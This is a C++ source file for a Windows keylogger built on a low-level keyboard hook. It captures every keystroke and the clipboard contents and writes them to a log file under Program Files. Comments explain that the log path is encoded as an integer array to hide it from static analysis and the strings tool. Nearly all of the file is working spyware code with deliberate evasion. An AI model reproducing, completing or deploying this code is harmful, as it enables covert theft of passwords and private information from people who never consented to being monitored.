#include "hookProc.h"

//this is where you will define the vector size for the saved characters before flushing.
//recommended size <= 1,000, since we don't want a string that's over ~2k characters.
constexpr int STRING_VECTOR_MAX_SIZE = 200;


std::vector<int> savedChars = {};
std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
std::vector<std::string> clipboardVector = {};
std::string storedClipboardContents = "";

//we do this instead of making it a string literal to somewhat halt static analysis of running strings
//this resolves to "C:\Program Files\kblog.txt"
//tested, works (strings doesn't pick it up)
std::vector<int> pathString = { 67, 58, 92, 80, 114, 111, 103, 114, 97, 109, 32, 70, 105, 108, 101, 115, 92, 107, 98, 108, 111, 103, 46, 116, 120, 116 };

bool is_shift_on = false; //GLOBAL
bool is_control_on = false; //global
int error_count = 0;

#define USE_LITERALS false;

#define USE_ADMIN true; //false if you want to run as non-admin, but not advised.

LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
{
	KBDLLHOOKSTRUCT* keyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam);

#if USE_LITERALS

	std::cout << keyboardStruct->vkCode << '\n';

#else

	is_shift_on = handleShift();
	is_control_on = handleCTRL();

	auto vk = keyboardStruct->vkCode;

	if (vk != VK_LSHIFT && vk != VK_RSHIFT && vk != VK_LCONTROL && vk != VK_RCONTROL && wparam == WM_KEYDOWN)
	{

		//if statements all went through. we can now run our funcs.

		//don't know if we're actually going to handle control or not...
		//if (is_control_on)
		//	curCharStr += "c";

		int curCharInt = handleCharsFinal(vk, is_shift_on);
		savedChars.push_back(curCharInt);

#ifndef USE_ADMIN
		char username[UNLEN + 1];
		DWORD username_length = UNLEN + 1;
		if (GetUserNameA(username, &username_length))
		{

		}
#else

		flushChars(savedChars, pathString, error_count, true, STRING_VECTOR_MAX_SIZE);
		std::cout << savedChars.size() << '\n';

#endif
	}

	if (grabClipboard(storedClipboardContents))
	{
		//clipboard handling here
		clipboardVector.push_back(storedClipboardContents);
	}

#endif

	return CallNextHookEx(NULL, code, wparam, lparam);
}